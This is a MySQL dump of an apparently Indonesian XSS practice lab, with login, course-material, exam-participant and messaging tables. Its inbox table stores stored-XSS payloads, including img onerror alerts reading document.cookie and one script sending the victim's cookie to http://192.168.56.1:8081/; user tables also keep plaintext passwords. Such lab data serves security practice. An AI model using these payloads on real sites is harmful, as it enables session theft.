-- MySQL dump 10.13  Distrib 5.5.53, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: nemo_dwp
-- ------------------------------------------------------
-- Server version	5.5.53-0ubuntu0.14.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login_user`
--

DROP TABLE IF EXISTS `login_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login_user` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `no_p` int(20) NOT NULL,
  `uname` varchar(20) NOT NULL,
  `pass` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login_user`
--

LOCK TABLES `login_user` WRITE;
/*!40000 ALTER TABLE `login_user` DISABLE KEYS */;
INSERT INTO `login_user` VALUES (1,12340,'ikhwan','123456'),(2,12341,'musriani','musriani'),(3,12342,'muslimah','muslimah'),(4,12343,'jusman','jusman');
/*!40000 ALTER TABLE `login_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `materi`
--

DROP TABLE IF EXISTS `materi`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `materi` (
  `id` int(6) unsigned NOT NULL AUTO_INCREMENT,
  `judul` varchar(50) NOT NULL,
  `pemateri` varchar(50) DEFAULT NULL,
  `namafile` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `materi`
--

LOCK TABLES `materi` WRITE;
/*!40000 ALTER TABLE `materi` DISABLE KEYS */;
INSERT INTO `materi` VALUES (1,'materi pemrograman php','nezim kerinci','c921f1bded92b24e3cd296ae44437c43materi_pemrograman_php.pdf'),(2,'materi framework Code igniter','aradyka','177ac71d9b15fe3befbca8043fc908bcmateri_code_igniter.pdf'),(3,'materi framework YII','Andi Mo','72f8f12b8d27c96b1537bea5a87e0c07materi_framework_yii.pdf');
/*!40000 ALTER TABLE `materi` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `peserta_pns`
--

DROP TABLE IF EXISTS `peserta_pns`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `peserta_pns` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `no_p` int(20) NOT NULL,
  `nama` varchar(50) NOT NULL,
  `alamat` varchar(80) NOT NULL,
  `no_hp` char(12) NOT NULL,
  `tgl_ujian` date NOT NULL,
  `kode_meja` char(5) NOT NULL,
  `kode_soal` char(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `no_p` (`no_p`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `peserta_pns`
--

LOCK TABLES `peserta_pns` WRITE;
/*!40000 ALTER TABLE `peserta_pns` DISABLE KEYS */;
INSERT INTO `peserta_pns` VALUES (1,12340,'Muh ikhwan','sleman','088800125473','2015-02-21','01','A321'),(2,12341,'musriani','bantul','085566992256','2015-02-21','02','B321'),(3,12342,'muslimah','solo','081123456789','2015-02-21','03','A321'),(4,12343,'jusman','magelang','088987654321','2015-02-21','04','C321'),(5,12344,'John Andrean ','jogja','081123456756','2015-02-21','05','B321'),(6,12345,'Dedi Utomo','semarang','088987654123','2015-02-21','06','C321');
/*!40000 ALTER TABLE `peserta_pns` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xss_note`
--

DROP TABLE IF EXISTS `xss_note`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xss_note` (
  `note_id` int(5) NOT NULL AUTO_INCREMENT,
  `user_id` int(5) NOT NULL,
  `note` varchar(200) NOT NULL DEFAULT '"add self note"',
  PRIMARY KEY (`note_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xss_note`
--

LOCK TABLES `xss_note` WRITE;
/*!40000 ALTER TABLE `xss_note` DISABLE KEYS */;
INSERT INTO `xss_note` VALUES (2,1,'tess'),(3,2,'tess');
/*!40000 ALTER TABLE `xss_note` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xss_profil_user`
--

DROP TABLE IF EXISTS `xss_profil_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xss_profil_user` (
  `id_profil` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(50) NOT NULL,
  `email` varchar(20) NOT NULL,
  `pass` varchar(80) NOT NULL,
  `tgl_lahir` date NOT NULL,
  PRIMARY KEY (`id_profil`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xss_profil_user`
--

LOCK TABLES `xss_profil_user` WRITE;
/*!40000 ALTER TABLE `xss_profil_user` DISABLE KEYS */;
INSERT INTO `xss_profil_user` VALUES (1,'userA','userA@nemosec.id','userA','1990-01-01'),(2,'userB','userB@nemosec.id','userB','1990-01-01'),(3,'userC','userC@nemosec.id','userC','1996-09-01');
/*!40000 ALTER TABLE `xss_profil_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `xss_user_inbox`
--

DROP TABLE IF EXISTS `xss_user_inbox`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `xss_user_inbox` (
  `id_pesan` int(10) NOT NULL AUTO_INCREMENT,
  `id_profil_user` int(10) NOT NULL,
  `id_pengirim` int(10) NOT NULL,
  `judul_p` varchar(50) NOT NULL,
  `pesan` text NOT NULL,
  `status_baca` int(2) NOT NULL,
  PRIMARY KEY (`id_pesan`),
  KEY `id_profil_user` (`id_profil_user`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `xss_user_inbox`
--

LOCK TABLES `xss_user_inbox` WRITE;
/*!40000 ALTER TABLE `xss_user_inbox` DISABLE KEYS */;
INSERT INTO `xss_user_inbox` VALUES (1,2,1,'tes','<script>alert(\"halo kamu kena hack\");</script>',1),(2,2,1,'tes','<script>\r\ndocument.location=\"http://192.168.56.1:8081/\"+document.cookie;\r\n</script>',1),(3,3,2,'jangan macam-macam ','jangan macam-macam kamu sama pacar saya!',0),(4,2,1,'tes','<h1>tes</h1>',1),(5,2,1,'ready gan','<h1>ready</h1> ',1),(6,8,8,'mousey','<h1>ready</h1>',1),(7,9,4,'ready gan','<h1>ready</h1>',1),(8,7,6,'hallo','<h1>pesan ready</h1>',1),(9,5,8,'123','<h1>ready</h1>',1),(10,5,8,'tes','<img src=x oneerror=alert(10)>',1),(11,7,6,'hallo sec','<img src=x oneerror=alert(10)>',1),(12,2,1,'tes','<img src=x onerror=alert(10)>',1),(13,4,9,'tes','<img src=x onerror=alert(10)>',1),(14,5,8,'test','<img src=\"x\" onerror=\"alert(10)\">',1),(15,7,6,'hallo 2','<img src=x onerror=alert(10)>',1),(16,2,1,'tes','<img src=x onerror=alert(document.cookie)>',1),(17,5,8,'testing','<img src=x onerror=alert(document.cookie)>',1),(18,4,9,'tes2','<img src=x onerror=alert(document.cookie)>',1),(19,7,6,'curi cookie','<img src=x onerror=alert(document.cookie)>',1),(20,5,8,'testing22','<img src=x onerror=alert(document.cookie)>',1),(21,8,5,'testing','<img src=x onerror=alert(document.cookie)>',1);
/*!40000 ALTER TABLE `xss_user_inbox` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-05-09 21:38:34
